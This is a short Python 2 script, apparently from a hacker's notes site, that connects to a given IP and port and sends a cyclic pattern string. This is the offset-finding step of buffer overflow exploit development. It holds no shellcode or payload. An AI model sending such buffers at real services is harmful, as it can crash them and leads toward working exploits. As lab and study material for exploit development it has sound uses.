#!/usr/bin/python2
#Johnny Chafla | @jch | @hacknotes
#site https://hacknotes.github.io/

import socket, sys

if len(sys.argv) < 3:
	print ("\n Usage: python " + sys.argv[0] + " <ip address> <port>\n")
	sys.exit(0)

ipADD = sys.argv[1]
rPort = sys.argv[2]

if __name__=='__main__':
  
 buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ipADD, int(rPort)))
 miData = buffer + '\r\n'
 s.send(miData)
 data = s.recv(1024)
